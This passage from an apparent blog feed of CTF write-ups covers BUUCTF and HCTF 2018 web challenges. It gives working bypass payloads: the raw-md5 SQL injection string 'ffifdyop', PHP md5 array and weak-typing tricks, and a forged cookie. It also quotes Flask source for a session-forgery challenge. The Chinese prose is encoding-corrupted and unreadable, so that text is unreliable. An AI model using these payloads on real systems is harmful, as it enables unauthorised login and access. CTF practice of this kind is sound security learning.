tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æäº¤ä¸€ä¸ªå€¼æŠ“åŒ…è¯•è¯•</p><p>å‘ç°å“åº”å¤´ä¸­æœ‰hint</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Hint: <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">'admin'</span> <span class="token keyword">where</span> password<span class="token operator">=</span>md5<span class="token punctuation">(</span>$pass<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œè€ƒå¯Ÿmd5çš„çŸ¥è¯†</p><p><code>md5($pass,true)</code>è¿”å›$pass md5çš„16è¿›åˆ¶å†…å®¹ï¼Œè¾“å‡ºè§£æå°±å½¢æˆ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or'</span><span class="token number">6</span>XXXX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cAor1e.png" alt="cAor1e.png"></p><p>è¢«sqlè¯­å¥è§£æï¼Œå°±èƒ½å½¢æˆæ‹¼æ¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payloadpassword<span class="token operator">=</span>ffifdyopæ‹¼æ¥åï¼š<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token string">'admin'</span> <span class="token keyword">where</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token operator">or</span><span class="token string">'6XXXX'</span>å³å¯ç»•è¿‡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›å…¥levels91.php     Do You Like MD5?æŸ¥çœ‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œåˆè€ƒå¯Ÿå“ˆå¸Œç¢°æ’ï¼Œä¹Ÿå¯ä»¥ç”¨[]ç»•è¿‡  <code>== !=</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payloada<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">or</span>a<span class="token operator">=</span>s878926199a<span class="token operator">&amp;</span>b<span class="token operator">=</span>s155964671a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä¸€æ ·ï¼Œmd5[]ç»•è¿‡ <code>=== !==</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadparam1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜ 2019BuyFlag</title>
      <link href="/2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/"/>
      <url>/2021/03/31/ji-ke-da-tiao-zhan-2019-buyflag/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>è¿›å…¥payflagé¡µé¢ï¼ŒæŸ¥çœ‹æºç ï¼Œå¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"password can't be number&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Password Right!&lt;/br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cFIHdf.png" alt="cFIHdf.png"></p><p>å¹¶ä¸”åˆ†æå›¾ç‰‡ï¼Œå¾—åˆ°ä»¥ä¸‹ä¿¡æ¯</p><p>éœ€è¦ä¼ å…¥<code>money=100000000</code>å’Œ<code>password=404</code>å¹¶ä¸”passwordä¸èƒ½è¢«æ£€æŸ¥ä¸ºæ•°å­—ï¼Œè¿˜éœ€è¦æ˜¯CUITçš„å­¦ç”Ÿ</p><p><code>password==404</code> ç”¨åˆ°phpçš„å¼±ç±»å‹ï¼Œ<code>password=404a</code>å³å¯ç»•è¿‡</p><p>CUITçš„å­¦ç”ŸPOSTå‚æ•°æ²¡è¯´ï¼Œå¯èƒ½åœ¨æŠ¥æ–‡çš„å¤´é‡Œé¢ï¼ŒæŠ“åŒ…çœ‹çœ‹</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user=0</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœç„¶æ˜¯å¸¦cookieçš„ï¼Œå°†cookieçš„å€¼ä¿®æ”¹ä¸º1ï¼ˆéƒ½è¡Œï¼‰</p><p>æ„é€ payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">password<span class="token operator">=</span><span class="token number">404</span>a<span class="token operator">&amp;</span>money<span class="token operator">=</span><span class="token number">100000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cFILFS.png" alt="cFILFS.png"></p><p>too long !!!!</p><p>åº”è¯¥æ˜¯strcmpå‡½æ•°æ£€æµ‹åˆ°äº†é•¿åº¦</p><p>money[]ç»•è¿‡</p><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">password<span class="token operator">=</span><span class="token number">404</span>a<span class="token operator">&amp;</span>money<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">100000000</span>cookie<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/03/31/cFIxQs.png" alt="cFIxQs.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018 admin</title>
      <link href="/2021/03/27/hctf-2018-admin/"/>
      <url>/2021/03/27/hctf-2018-admin/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>è¿›å…¥é¡µé¢ï¼Œå¼±å¯†ç ç™»å½•ç«Ÿç„¶æˆåŠŸäº†ï¼Œå¾—åˆ°äº†flag</p><p>è¿˜æ˜¯çœ‹çœ‹è¿™é“é¢˜çš„è€ƒç‚¹</p><p>é¦–é¡µæºä»£ç ä¸­<code>&lt;!-- you are not admin --&gt;</code></p><p>æƒ³è¯•è¯•äºŒæ¬¡æ³¨å…¥å¥½åƒä¸è¡Œ</p><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•</p><p>ç™»å½•å<code>post</code>é‡Œé¢è¯•ä¸€ä¸‹xssï¼Œä¹Ÿä¸è¡Œ</p><p>é‚£å°±<code>change password</code>å¾—åˆ°<code>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</code></p><p>ä¸‹è½½ï¼Œå¥½åƒæ˜¯æºç ï¼Œpythonæˆ‘ä¹Ÿä¸å¤ªæ‡‚</p><p>æ¥ä¸‹æ¥å‚è€ƒåˆ«äººçš„wp</p><h4 id="å¼±å¯†ç "><a href="#å¼±å¯†ç " class="headerlink" title="å¼±å¯†ç "></a>å¼±å¯†ç </h4><p>123ï¼Œå“ˆå“ˆ</p><h3 id="flask-sessionä¼ªé€ "><a href="#flask-sessionä¼ªé€ " class="headerlink" title="flask sessionä¼ªé€ "></a>flask sessionä¼ªé€ </h3><p><code>index.html</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">{% include('header.html') %}{% if current_user.is_authenticated %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello {{ session['name'] }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}{% if current_user.is_authenticated and session['name'] == 'admin' %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>hctf{xxxxxxxxx}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}<span class="token comment">&lt;!-- you are not admin --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Welcome to hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% include('footer.html') %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>{% if current_user.is_authenticated and session['name'] == 'admin' %}</code></p><p>è¿™è¯´çš„æ˜¯ä¼ å…¥çš„<code>seesion</code>=<code>admin</code>å°±ä¼šæ‰§è¡Œåé¢çš„ï¼Œæ„æ€å·®ä¸éƒ½æ˜¯ç™»å½•adminï¼Œæ˜¾ç¤ºflag</p><p><code>routes.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> logout_user<span class="token punctuation">,</span> LoginManager<span class="token punctuation">,</span> current_user<span class="token punctuation">,</span> login_user<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token punctuation">,</span> db<span class="token keyword">from</span> config <span class="token keyword">import</span> Config<span class="token keyword">from</span> app<span class="token punctuation">.</span>models <span class="token keyword">import</span> User<span class="token keyword">from</span> forms <span class="token keyword">import</span> RegisterForm<span class="token punctuation">,</span> LoginForm<span class="token punctuation">,</span> NewpasswordForm<span class="token keyword">from</span> twisted<span class="token punctuation">.</span>words<span class="token punctuation">.</span>protocols<span class="token punctuation">.</span>jabber<span class="token punctuation">.</span>xmpp_stringprep <span class="token keyword">import</span> nodeprep<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">from</span> code <span class="token keyword">import</span> get_verify_code<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥</span>    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>    <span class="token comment"># å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­</span>    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'hctf'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                flash<span class="token punctuation">(</span><span class="token string">'post successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'edit.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'edit'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>    title <span class="token operator">=</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    message <span class="token operator">=</span> error<span class="token punctuation">.</span>description    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'errors.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">,</span> message<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username<span aria-hidden="true" 